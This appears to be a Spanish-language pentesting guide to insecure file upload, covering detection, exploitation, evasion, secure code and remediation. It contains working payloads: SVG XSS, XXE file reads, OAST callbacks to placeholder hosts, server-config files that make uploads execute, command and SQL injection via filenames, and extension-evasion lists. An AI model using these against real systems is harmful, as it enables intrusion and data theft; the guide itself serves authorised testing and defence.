# Subida insegura de ficheros (Unrestricted File Upload)

| Clasificación | |
|---|---|
| CWE | CWE-434 — Unrestricted Upload of File with Dangerous Type; CWE-646 — Reliance on File Name or Extension of Externally-Supplied File; CWE-22 (nombre con `../`, zip slip); CWE-79 (SVG/HTML servidos inline); CWE-400 (bombas de descompresión, *pixel flood*) |
| OWASP Top 10:2025 | A06 — Insecure Design (CWE-434); según el resultado también A05 — Injection (XSS, XXE, inyección en nombre) y A02 — Security Misconfiguration (servidor que ejecuta el directorio de subidas) |
| OWASP API Top 10:2023 | API8:2023 — Security Misconfiguration (almacenamiento/servido); API4:2023 — Unrestricted Resource Consumption (tamaño, número, descompresión) |
| WSTG | WSTG-BUSL-08 (Test Upload of Unexpected File Types); WSTG-BUSL-09 (Test Upload of Malicious Files) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura (mapa de validaciones) · 4. Explotación por contexto (ejecución en servidor PHP/ASP.NET/JSP, ficheros de configuración `.htaccess`/`web.config`/`.user.ini`, XSS con SVG/HTML/PDF, XXE y SSRF en formatos XML, procesadores ImageMagick/ExifTool/Ghostscript/FFmpeg, archivos comprimidos y zip slip, nombre de fichero como vector, almacenamiento en la nube y CDN, carreras) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Una función de subida es vulnerable cuando el servidor acepta, guarda, procesa o sirve un fichero cuyo **tipo, contenido, nombre, tamaño o ubicación** no controla adecuadamente. El impacto depende de qué pasa después con el fichero:

- **Se ejecuta en el servidor** (queda en un directorio donde el servidor web interpreta `.php`, `.aspx`, `.jsp`…): ejecución remota de código mediante una *webshell* (script que ejecuta órdenes recibidas por HTTP).
- **Se sirve al navegador en el mismo origen** con un tipo interpretable (`text/html`, `image/svg+xml`): XSS almacenado.
- **Se procesa** con librerías complejas (ImageMagick, ExifTool, Ghostscript, LibreOffice, FFmpeg, parsers XML): SSRF, XXE, lectura de ficheros o RCE por fallos del procesador.
- **Se extrae** (ZIP/TAR): escritura fuera del destino (zip slip), bombas de descompresión.
- **Su nombre** se usa en rutas, comandos u otras consultas: path traversal, inyección de comandos, SQLi, XSS.

Validaciones débiles típicas: comprobar solo en el cliente (JavaScript), confiar en `Content-Type` (lo fija el cliente), listas negras de extensiones incompletas, comprobar solo los **bytes mágicos** (primeros bytes que identifican un formato, p. ej. `GIF89a`, `\x89PNG`), conservar el nombre original, guardar dentro del *web root* y servir desde el dominio principal.

## 2. Dónde buscar (señales del reconocimiento)

- Avatares y fotos de perfil, adjuntos de tickets/mensajes, gestores documentales, importaciones (CSV, XLSX, XML, JSON, ICS, vCard), temas/plugins/plantillas de CMS, restauración de copias, subida de certificados/claves, logos de organización, "subir desde URL" (ver `vulns/ssrf.md`).
- Subidas en dos pasos: el backend devuelve una **URL prefirmada** (*presigned URL*: URL temporal firmada que autoriza a subir directamente a S3/GCS/Azure Blob) y el cliente sube allí.
- APIs: `multipart/form-data`, cuerpos binarios con `Content-Type: application/octet-stream`, base64 en JSON (`"file": "data:image/png;base64,..."`), subidas por trozos (*chunked*, tus.io, S3 multipart).
- Pistas de procesado: miniaturas generadas, conversión a PDF, vista previa de documentos, extracción de metadatos, antivirus (mensajes de "escaneando").
- Dónde acaba el fichero: URL devuelta en la respuesta, nombre conservado o renombrado (hash/UUID), dominio (mismo origen, subdominio, CDN, bucket), cabeceras al servirlo (`Content-Type`, `Content-Disposition`, `X-Content-Type-Options`, `Content-Security-Policy`).

## 3. Detección segura (primeras sondas, no destructivas)

Construye un **mapa de validaciones** cambiando una sola variable cada vez a partir de una subida legítima:

| Variable | Pruebas |
|---|---|
| Extensión | `.png` → `.txt` → `.html` → `.svg` → `.php` → `.pHp` → `.php5` → `.phtml` |
| `Content-Type` del *part* | el real, `image/png` con contenido de texto, ausente, duplicado |
| Bytes mágicos | texto plano frente a `GIF89a` + texto |
| Contenido | imagen válida, imagen con texto añadido al final, imagen reprocesada |
| Nombre | caracteres especiales, `../`, muy largo, Unicode, nombre vacío |
| Tamaño / dimensiones | límites, imagen de 1x1 frente a dimensiones enormes (no envíes bombas) |

Después, **localiza y pide el fichero**: ¿se conserva nombre y extensión?, ¿qué `Content-Type` devuelve?, ¿se sirve inline o como descarga?, ¿desde qué dominio? Usa contenidos **marcadores** en todas las pruebas:

```
CORVUS-UPLOAD-POC-<id>                                     # .txt
<?php echo 'CORVUS-'.(7*7); ?>                              # PHP: imprime CORVUS-49, no ejecuta órdenes
<%= "CORVUS-" + (7*7) %>                                    # JSP / ASPX inline
<!--#echo var="DATE_LOCAL" -->                              # .shtml (SSI)
```

## 4. Explotación por contexto o tecnología

### 4.1 Ejecución en el servidor

Extensiones ejecutables por plataforma:

```
PHP:          .php .php3 .php4 .php5 .php7 .php8 .phtml .pht .phar .phps .pgif .inc .module (Drupal)
ASP/ASP.NET:  .asp .aspx .ashx .asmx .asa .cer .cshtml .vbhtml .svc .xamlx .soap .config
Java:         .jsp .jspx .jsw .jsv .jspf .war (despliegue)
Otros:        .cfm .cfml .cfc (ColdFusion)  .pl .cgi .py .rb  .shtml .stm .shtm (SSI)  .lua
```

Marcadores por tecnología (sustituyen a la *webshell*; ⚠️ una *webshell* que ejecute órdenes o una *reverse shell* requiere confirmación explícita del cliente y borrado inmediato):

```php
<?php echo 'CORVUS-'.(7*7).'-'.php_uname('n'); ?>
```

```jsp
<%= "CORVUS-" + (7*7) + "-" + java.net.InetAddress.getLocalHost().getHostName() %>
```

```aspx
<%@ Page Language="C#" %><%= "CORVUS-" + (7*7) + "-" + Environment.MachineName %>
```

Peculiaridades de servidores:

- **Apache con `AddHandler application/x-httpd-php .php`**: ejecuta cualquier fichero que tenga `.php` en *alguna* de sus extensiones (`marker.php.jpg`).
- **nginx + PHP-FPM con `cgi.fix_pathinfo=1`** y sin `try_files`: `/uploads/avatar.jpg/x.php` ejecuta `avatar.jpg` como PHP (configuración antigua).
- **IIS 6**: `marker.asp;.jpg` se ejecuta como ASP; directorios `x.asp/` ejecutan su contenido.
- **Windows/NTFS**: `marker.aspx.` (punto final), `marker.aspx::$DATA` (flujo alternativo de datos), `marker.aspx%20` se guardan como `marker.aspx`.
- **Tomcat**: subir un `.war` a un directorio de despliegue automático (`webapps/`) lo despliega. ⚠️ Requiere confirmación explícita del cliente.

### 4.2 Ficheros de configuración subidos

⚠️ Subir ficheros de configuración cambia el comportamiento del servidor para todo el directorio: requiere confirmación explícita del cliente; elimínalos al terminar.

```apache
# .htaccess (Apache con AllowOverride): hace que .corvus se ejecute como PHP
AddType application/x-httpd-php .corvus
# Alternativa si AddType no está permitido:
# <FilesMatch "\.corvus$"> SetHandler application/x-httpd-php </FilesMatch>
```

```ini
; .user.ini (PHP-FPM/CGI): antepone un fichero a cada .php del directorio
auto_prepend_file=marker.gif
; marker.gif contiene: GIF89a<?php echo 'CORVUS-'.(7*7); ?>
```

```xml
<!-- web.config (IIS): el propio fichero se ejecuta como ASP clásico y muestra un marcador -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions>
      <hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security>
  </system.webServer>
</configuration>
<!-- <% Response.Write("CORVUS-" & 7*7) %> -->
```

Otros: `uwsgi.ini` con *magic variables* si el servidor recarga configuración del directorio; `.pth` en `site-packages` (Python) si la subida permite escribir allí; `package.json`/`node_modules` en despliegues que instalan dependencias.

### 4.3 XSS y contenido activo en el navegador

Peligroso si el fichero se sirve **inline desde el origen de la aplicación** (o un subdominio que comparte cookies).

```xml
<!-- SVG mínimo -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

```xml
<!-- SVG con script y contenido visible -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="5" y="30">CORVUS-SVG</text>
  <script>alert(document.domain)</script>
</svg>
```

```xml
<!-- SVG con foreignObject (HTML dentro de SVG) -->
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="400" height="100">
<body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(document.domain)"/></body></foreignObject></svg>
```

```
GIF89a/*<svg/onload=alert(document.domain)>*/=alert(document.domain)//;     # polígloto GIF/JS (si se sirve como script o HTML)
```

- `.html`, `.htm`, `.xhtml`, `.xml` (con espacio de nombres XHTML), `.shtml`, `.mht`: XSS directo.
- **Sniffing de tipo**: sin `X-Content-Type-Options: nosniff`, navegadores antiguos podían interpretar como HTML un fichero con tipo genérico.
- **PDF**: ejecución de JavaScript en visores; PDF.js anterior a 4.2.67 permitía ejecutar JS arbitrario al abrir un PDF malicioso (CVE-2024-4367) si la app lo muestra con PDF.js en su origen.
- **Nombre del fichero** reflejado en la interfaz: `"><img src=x onerror=alert(document.domain)>.png` (ver §4.7).
- Para elevar el impacto de un XSS almacenado ver `vulns/xss.md`.

### 4.4 XXE y SSRF en formatos basados en XML o con referencias externas

```xml
<!-- SVG con entidad externa (procesado en servidor para generar miniaturas) -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="50"><text x="0" y="20">&xxe;</text></svg>
```

```xml
<!-- SVG con referencia de imagen remota: OAST / SSRF -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">
  <image xlink:href="http://p-svg.<id>.oast.example/x.png" width="10" height="10"/>
</svg>
```

- **DOCX/XLSX/PPTX/ODT** son ZIP con XML: modifica `word/document.xml`, `xl/sharedStrings.xml` o `[Content_Types].xml` para añadir un `DOCTYPE` con entidad externa hacia tu OAST (ver `vulns/xxe.md`).
- **XLSX/CSV**: inyección de fórmulas al exportar/abrir (`=HYPERLINK("http://<oast>/","x")`) — ver `vulns/otras-inyecciones.md`.
- **Vídeo**: listas HLS (`.m3u8`, o `.avi`/`.mp4` que las contienen) procesadas por FFmpeg pueden leer ficheros locales o pedir URLs al generar miniaturas.

### 4.5 Procesadores de imagen y documentos

- **ImageMagick**: ImageTragick (CVE-2016-3714 y relacionadas) en versiones muy antiguas; lectura arbitraria de ficheros incrustada en PNG mediante el chunk de texto `profile` (CVE-2022-44268): la imagen redimensionada resultante contiene el fichero leído en hexadecimal. Prueba de SSRF/lectura con MVG si la política lo permite:

  ```
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(http://p-mvg.<id>.oast.example/)'
  pop graphic-context
  ```

- **ExifTool**: ejecución de código al procesar ficheros DjVu (CVE-2021-22204, versiones 7.44–12.23), alcanzable subiendo una "imagen" que en realidad es DjVu. ⚠️ Cualquier payload de ejecución requiere confirmación explícita del cliente; como prueba usa solo la detección de versión.
- **Ghostscript** (usado por ImageMagick para PDF/PS/EPS): CVE-2023-36664 (manejo de *pipes* en rutas) y CVE-2024-29510 (cadena de formato) permiten RCE con EPS/PDF subidos. ⚠️ Requiere confirmación explícita del cliente.
- **LibreOffice/unoconv** en conversión de documentos: macros, enlaces externos y campos que leen ficheros.
- **gifoeb** (filtrado de memoria por GIF mal formado en ImageMagick antiguo): genera GIFs que, tras el procesado, devuelven memoria del proceso en los píxeles.
- Identifica la librería y la versión por mensajes de error, metadatos de la miniatura (`exiftool miniatura.png`) o comportamiento, y busca avisos públicos antes de probar nada ofensivo.

### 4.6 Archivos comprimidos

- **Zip slip**: entradas con `../` o rutas absolutas (generador y precauciones en `vulns/path-traversal-lfi.md` §4.8). ⚠️ Escribe ficheros: requiere confirmación explícita del cliente.
- **Enlaces simbólicos** dentro de ZIP/TAR: si la app extrae y luego sirve el contenido, un enlace a `/etc/hostname` lo expone (lectura).

  ```bash
  ln -s /etc/hostname leak.txt && zip --symlinks symlink_poc.zip leak.txt
  ```

- **Inclusión vía `zip://` o `phar://`** cuando existe LFI.
- **Bombas de descompresión** (*zip bomb*) e imágenes con dimensiones enormes (*pixel flood*, p. ej. 64 000 × 64 000 píxeles comprimidos en pocos KB): ⚠️ DoS, requiere confirmación explícita del cliente. Como prueba segura, verifica en caja blanca o con documentación si existen límites de tamaño descomprimido y de píxeles.

### 4.7 Nombre de fichero como vector

```
filename="../../../../tmp/corvus_poc.txt"           # traversal al guardar (⚠️ escritura)
filename="..%2f..%2fcorvus_poc.txt"
filename="/tmp/corvus_poc.txt"
filename="\\<IP-auditor>\share\x.png"                # UNC en Windows (⚠️ fuga NTLM)
filename="\"><img src=x onerror=alert(document.domain)>.png"
filename="corvus'\"`;sleep 5;.png"                   # inyección de comandos si el nombre llega a una shell (mide el tiempo)
filename="corvus$(sleep 5).png"
filename="corvus' AND SLEEP(5)-- -.png"              # SQLi si el nombre se inserta sin parametrizar
filename="corvus.png" ; filename*=UTF-8''corvus.php  # parámetros duplicados / RFC 5987
filename="corvus.php\u202Egnp.png"                   # RTLO: oculta la extensión real al usuario
filename="AAAA…(300 caracteres)….php.png"            # truncado por longitud: puede quedar "....php"
```

Pruebas de tiempo (`sleep 5`) son no destructivas; compáralas con una línea base. Ver `vulns/cmdi-rce.md` y `vulns/sqli.md`.

### 4.8 Almacenamiento en la nube, CDN y URLs prefirmadas

- **URL prefirmada de PUT** que no fija `Content-Type`: subir `text/html` o SVG al bucket y servirlo desde un dominio que la app usa (o que comparte cookies) → XSS.
- **Clave del objeto controlada** por el cliente (`key=avatars/123.png`): cambiarla a `avatars/otro_usuario.png` o `../`, o sobrescribir objetos ajenos (⚠️ sobrescritura: requiere confirmación explícita del cliente; demuestra con una clave nueva).
- **Presigned POST** con política laxa (`starts-with $key ""`, sin `content-length-range`, sin condición de `Content-Type`).
- Bucket o contenedor **listable o escribible** públicamente (ver `vulns/config-exposure.md`).
- **CDN/proxies de imagen** (imgproxy, Thumbor, Cloudinary *fetch*) con origen remoto: SSRF.
- Ficheros privados servidos sin autorización por URL predecible (`/uploads/<id>.pdf`): ver `vulns/access-control-idor.md`.

### 4.9 Carreras y validación asíncrona

- El fichero se guarda en una ruta accesible y **después** se valida o se borra: pide la URL en bucle durante la subida (Turbo Intruder, envío en paralelo; ver `vulns/race-condition.md`).
- Escaneo antivirus o moderación asíncrona: el fichero es accesible antes de que termine.
- Subidas por trozos: se valida el primer trozo (bytes mágicos) y no el fichero final ensamblado.

## 5. Evasión de filtros y WAF

```
marker.pHp  marker.PHP5  marker.PhAr                       # mayúsculas
marker.php.jpg  marker.jpg.php  marker.php.blah123jpg      # doble extensión / regex débil
marker.php.  marker.php....  marker.php%20  marker.php%09  marker.php%0a  marker.php/  marker.php.\
marker.php%00.jpg  marker.php\x00.jpg                      # byte nulo (PHP < 5.3.4 y plataformas antiguas)
marker.php;.jpg  marker.asp;.jpg                           # punto y coma (IIS)
marker.aspx::$DATA  marker.php:.jpg                        # flujos alternativos NTFS
.php  .htaccess                                            # solo extensión
marker.php%2500.jpg  marker.p%68p                          # codificación en el nombre del part
```

- **`Content-Type`**: pon el de una imagen (`image/png`) con contenido arbitrario, elimínalo o duplícalo.
- **Bytes mágicos**: antepón la firma del tipo permitido:

  ```
  GIF89a;<?php echo 'CORVUS-'.(7*7); ?>
  \x89PNG\r\n\x1a\n…                 # PNG
  \xFF\xD8\xFF\xE0…                  # JPEG
  %PDF-1.7                           # PDF
  ```

- **Políglotos** (ficheros válidos en dos formatos a la vez): imagen real con código en metadatos o tras el final de los datos:

  ```bash
  exiftool -Comment="<?php echo 'CORVUS-'.(7*7); ?>" foto.jpg -o marker.php.jpg
  cat foto.png marker.txt > poliglota.png        # datos añadidos tras el chunk IEND
  ```

  Si el servidor **reprocesa** la imagen (GD, Imagick), los metadatos se pierden; existen técnicas para incrustar código que sobrevive a la compresión (p. ej. en el chunk IDAT de PNG o en tablas de JPEG), útiles solo si después hay ejecución o inclusión.

- **Multipart malformado** (para WAF): parámetro `filename` duplicado, `filename*=`, comillas desequilibradas, saltos de línea en cabeceras del *part*, `boundary` con caracteres inusuales, `Content-Disposition` en mayúsculas; el WAF y el framework pueden extraer nombres distintos. Más en `vulns/waf-bypass.md`.
- **Validación solo en cliente**: intercepta y modifica en Burp tras pasar el JavaScript.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

| Cadena | Demostración segura |
|---|---|
| Subida de script ejecutable → RCE | Marcador `CORVUS-49` + nombre de host; ⚠️ órdenes del sistema solo con confirmación explícita; borrar el fichero y registrarlo |
| `.htaccess`/`.user.ini`/`web.config` → RCE | ⚠️ Requiere confirmación explícita; restaurar el estado |
| SVG/HTML en el mismo origen → XSS almacenado | `alert(document.domain)`; para impacto, leer un dato propio de la cuenta de prueba, nunca de usuarios reales |
| SVG/DOCX → XXE → lectura de ficheros / SSRF | `/etc/hostname` u OAST |
| Procesador vulnerable → RCE | Identificar versión y CVE; ⚠️ explotar solo con confirmación explícita |
| Subida + LFI | Incluir el marcador subido (ver `vulns/path-traversal-lfi.md`) |
| Subida + deserialización (PHAR, ficheros de sesión) | Ver `vulns/deserialization.md` |
| Sobrescritura de ficheros ajenos (clave o nombre controlado) | Demostrar con un fichero nuevo y una cuenta propia |
| Subida pública sin límites → almacenamiento de malware / phishing en dominio de confianza | Fichero `.html` inocuo con marcador; no alojar contenido malicioso |

## 7. Caja blanca: fuentes, sumideros y patrones de código

Revisa: dónde se guarda (dentro/fuera del *web root*), cómo se genera el nombre, qué se valida (extensión, tipo real, tamaño, dimensiones), si se reprocesa, cómo se sirve (cabeceras) y qué librerías procesan el fichero.

**PHP**

```php
// VULNERABLE: nombre original, comprobación del Content-Type del cliente, carpeta pública
if ($_FILES['f']['type'] === 'image/png') {
  move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']);
}

// SEGURO
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($_FILES['f']['tmp_name']);
$ext   = ['image/png' => 'png', 'image/jpeg' => 'jpg'][$mime] ?? null;
if (!$ext || $_FILES['f']['size'] > 5_000_000) { http_response_code(400); exit; }
$img = imagecreatefromstring(file_get_contents($_FILES['f']['tmp_name']));   // reprocesar = eliminar contenido extra
$name = bin2hex(random_bytes(16)) . ".$ext";
imagepng($img, '/srv/uploads/' . $name);   // fuera del web root; se sirve por un controlador
```

**Java / Spring**

```java
// VULNERABLE
file.transferTo(new File("/var/www/app/uploads/" + file.getOriginalFilename()));

// SEGURO
String mime = new Tika().detect(file.getInputStream());          // tipo por contenido
if (!Set.of("image/png", "image/jpeg").contains(mime)) throw new BadRequestException();
Path dest = Paths.get("/srv/uploads").resolve(UUID.randomUUID() + (mime.equals("image/png") ? ".png" : ".jpg"));
Files.copy(file.getInputStream(), dest);
// Configurar spring.servlet.multipart.max-file-size y max-request-size
```

**Python / Django / Flask**

```python
# VULNERABLE
f = request.files["f"]; f.save(os.path.join("static/uploads", f.filename))

# SEGURO
from PIL import Image
Image.MAX_IMAGE_PIXELS = 40_000_000            # limita pixel flood
f = request.files["f"]
img = Image.open(f.stream); img.verify()       # valida formato
f.stream.seek(0); img = Image.open(f.stream)
if img.format not in ("PNG", "JPEG"): abort(400)
name = f"{uuid.uuid4().hex}.{img.format.lower()}"
img.convert("RGB").save(os.path.join(UPLOAD_DIR, name))   # reescritura, sin metadatos
# Django: FileExtensionValidator + validación de contenido; DATA_UPLOAD_MAX_MEMORY_SIZE / FILE_UPLOAD_MAX_MEMORY_SIZE
```

**Node / Express**

```js
// VULNERABLE (multer con nombre original en carpeta servida por express.static)
const upload = multer({ storage: multer.diskStorage({ destination: 'public/uploads', filename: (r, f, cb) => cb(null, f.originalname) }) });

// SEGURO
const { fileTypeFromBuffer } = await import('file-type');
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024, files: 1 } });
app.post('/avatar', upload.single('f'), async (req, res) => {
  const t = await fileTypeFromBuffer(req.file.buffer);
  if (!t || !['image/png', 'image/jpeg'].includes(t.mime)) return res.sendStatus(400);
  const out = await sharp(req.file.buffer, { limitInputPixels: 40e6 }).rotate().toFormat('png').toBuffer();
  await storage.put(`avatars/${crypto.randomUUID()}.png`, out, { contentType: 'image/png' });
  res.sendStatus(201);
});
```

**.NET**

```csharp
// VULNERABLE
await file.CopyToAsync(new FileStream(Path.Combine(env.WebRootPath, "uploads", file.FileName), FileMode.Create));

// SEGURO
var ext = Path.GetExtension(file.FileName).ToLowerInvariant();
if (!new[] { ".png", ".jpg" }.Contains(ext) || file.Length > 5_000_000) return BadRequest();
// Validar firma real del contenido (bytes iniciales) y reprocesar con una librería de imagen
var safeName = Path.GetRandomFileName() + ext;
var path = Path.Combine(_config["UploadRoot"], safeName);   // fuera de wwwroot
await using var fs = System.IO.File.Create(path);
await file.CopyToAsync(fs);
```

**Go**

```go
// VULNERABLE
dst, _ := os.Create(filepath.Join("./public/uploads", header.Filename))

// SEGURO
r.Body = http.MaxBytesReader(w, r.Body, 5<<20)
buf := make([]byte, 512); n, _ := file.Read(buf)
if ct := http.DetectContentType(buf[:n]); ct != "image/png" && ct != "image/jpeg" { http.Error(w, "tipo", 400); return }
name := uuid.NewString() + ".img"
dst, _ := root.Create(name)   // os.Root (Go 1.24+) sobre el directorio de subidas, fuera del árbol servido
```

**Ruby / Rails**

```ruby
# VULNERABLE
File.binwrite(Rails.root.join("public/uploads", params[:f].original_filename), params[:f].read)

# SEGURO (Active Storage + validación de tipo por contenido)
has_one_attached :avatar
validates :avatar, content_type: %w[image/png image/jpeg], size: { less_than: 5.megabytes }  # gema active_storage_validations
# Active Storage identifica el tipo con Marcel (contenido) y sirve desde rutas firmadas
```

**Búsqueda con ripgrep**

```bash
rg -n --pcre2 'move_uploaded_file|\$_FILES\[[^]]+\]\[.(name|type).\]' -g '*.php'
rg -n --pcre2 'getOriginalFilename\(\)|transferTo\(|MultipartFile|ServletFileUpload' -g '*.{java,kt}'
rg -n --pcre2 '\.filename\b|\.save\(|FileField|ImageField|request\.files' -g '*.py'
rg -n --pcre2 'originalname|multer\(|formidable|busboy|express-fileupload|mv\(' -g '*.{js,ts}'
rg -n --pcre2 'IFormFile|\.FileName\b|SaveAs\(|CopyToAsync\(' -g '*.cs'
rg -n --pcre2 'FormFile\(|MultipartForm|header\.Filename' -g '*.go'
rg -n --pcre2 'original_filename|CarrierWave|Paperclip|has_one_attached' -g '*.rb'
rg -n -i 'AllowOverride|AddHandler|AddType|cgi\.fix_pathinfo|X-Content-Type-Options|Content-Disposition' .
rg -n -i 'imagemagick|Imagick|MiniMagick|exiftool|ghostscript|gs -|libreoffice|unoconv|ffmpeg' .
```

**Semgrep**

```bash
semgrep --config p/security-audit --config p/owasp-top-ten .
```

```yaml
rules:
  - id: corvus-upload-original-filename
    languages: [javascript, typescript, python, java]
    severity: WARNING
    message: Se usa el nombre de fichero proporcionado por el cliente para guardar en disco
    pattern-either:
      - pattern: $F.originalname
      - pattern: $F.getOriginalFilename()
      - pattern: os.path.join(..., $F.filename)
```

## 8. Falsos positivos frecuentes

- La subida "acepta" el `.php` pero el servidor lo **sirve como texto** o lo descarga (no se ejecuta): es un hallazgo menor (o informativo), no RCE.
- El fichero se guarda en un **dominio aislado sin cookies** (sandbox de contenido, p. ej. `usercontent.example`): un SVG con script no da acceso a la sesión de la aplicación. Valora el riesgo de phishing por separado.
- Se sirve con `Content-Disposition: attachment` y `X-Content-Type-Options: nosniff`: el XSS no se ejecuta al abrir el enlace.
- El SVG se muestra con `<img src>`: los scripts no se ejecutan en ese contexto; hay que abrir la URL directa.
- La "imagen" con marcador PHP aparece en la respuesta porque se **muestra como texto**, no porque se ejecute.
- El antivirus o el WAF borra el fichero más tarde: confirma persistencia y ejecución real.

## 9. Evidencia mínima para validarlo

- Petición `multipart` completa (nombre, `Content-Type`, primeros bytes del contenido) y respuesta con la ubicación.
- Petición al fichero subido y respuesta que demuestra el comportamiento (marcador ejecutado `CORVUS-49`, `alert(document.domain)` con dominio visible, contenido XXE).
- Cabeceras con las que se sirve el fichero (`Content-Type`, `Content-Disposition`, CSP).
- Registro de ficheros subidos/creados con hora y ruta, y confirmación de su borrado.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| XSS almacenado con SVG/HTML en el origen (usuario autenticado sube, otro abre) | `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` |
| XXE/SSRF vía fichero subido con lectura de ficheros | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| RCE con usuario autenticado | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| RCE sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| RCE solo desde un panel de administración (subida de plugins por diseño) | `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (7.2) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| DoS por falta de límites (descompresión, píxeles) | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` (6.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |

Si la ejecución exige ganar una carrera, sube `AC:H` (3.1) o `AT:P` (4.0). Calcula la puntuación 4.0 exacta en la calculadora oficial de FIRST.

## 11. Remediación (con ejemplo de código correcto)

1. **Lista blanca** de extensiones *y* de tipos detectados por contenido; rechazar lo que no coincida.
2. **Nombre generado por el servidor** (UUID) y extensión derivada del tipo detectado, nunca del nombre original; guardar el nombre original solo como metadato escapado.
3. **Almacenar fuera del *web root*** o en almacenamiento de objetos sin permisos de ejecución; servir mediante un controlador que aplique autorización.
4. **Servir desde un dominio aislado** sin cookies de la aplicación, con `Content-Type` fijado por el servidor, `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` para tipos no imagen y `Content-Security-Policy: default-src 'none'; sandbox` en las respuestas de ficheros.
5. **Reprocesar** imágenes y documentos (CDR, *Content Disarm and Reconstruction*: reconstruir el fichero desde cero para eliminar contenido activo); eliminar metadatos.
6. **Aislar los procesadores** (contenedor sin red, seccomp, usuario sin privilegios); política restrictiva de ImageMagick (`policy.xml` desactivando MVG, MSL, PS, EPS, PDF, URL si no se necesitan); mantener al día ExifTool, Ghostscript, librerías de imagen.
7. **Límites**: tamaño, número de ficheros, tamaño descomprimido, número de entradas de archivo, dimensiones de imagen, tiempo de procesado.
8. Servidor web: desactivar ejecución en el directorio de subidas (`php_admin_flag engine off`, `AllowOverride None`, sin *handlers* en IIS).
9. Nube: URLs prefirmadas con caducidad corta, `Content-Type` y clave fijados en la firma, condición de tamaño en *presigned POST*, cubo de cuarentena y publicación tras validar.

```nginx
# nginx: nunca ejecutar nada en el directorio de subidas y forzar descarga
location ^~ /uploads/ {
    root /srv/static;
    default_type application/octet-stream;
    add_header X-Content-Type-Options nosniff always;
    add_header Content-Security-Policy "default-src 'none'; sandbox" always;
    add_header Content-Disposition "attachment" always;
    location ~ \.(php|phtml|phar)$ { return 403; }
}
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Repeater | Modificar nombre, `Content-Type`, contenido del *part* | Siempre primero, para el mapa de validaciones |
| Burp Upload Scanner (BApp) | Batería de extensiones, políglotos y tipos | Tras entender el flujo manualmente |
| Burp Intruder / `ffuf` | Fuzzing de extensiones en el campo `filename` con una lista (SecLists `Discovery/Web-Content/web-extensions.txt`) | Tras confirmar dónde se sirve el fichero |
| Fuxploider | Detección automática de extensiones aceptadas | Apoyo, con límite de peticiones |
| ExifTool | `exiftool -Comment='<marcador>' foto.jpg -o out.jpg`; identificar `Producer` de PDFs y miniaturas | Políglotos y huella de procesadores |
| `file`, `xxd`, `binwalk` | Verificar formato real y datos añadidos | Antes de subir |
| Turbo Intruder | Carreras subida/acceso | Validación asíncrona |
| Script Python (`zipfile`) / evilarc | Zip slip | ⚠️ Escritura: solo con confirmación explícita del cliente |
| Nuclei | Plantillas de CVE de procesadores y CMS | Tras identificar tecnología y versión |

## 13. Referencias

- OWASP — File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP WSTG — WSTG-BUSL-08 y WSTG-BUSL-09
- PortSwigger Web Security Academy — File upload vulnerabilities: https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings — Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- HackTricks — File Upload (book.hacktricks.wiki, sección *pentesting-web*)
- ImageMagick — Security Policy (`policy.xml`): https://imagemagick.org/script/security-policy.php
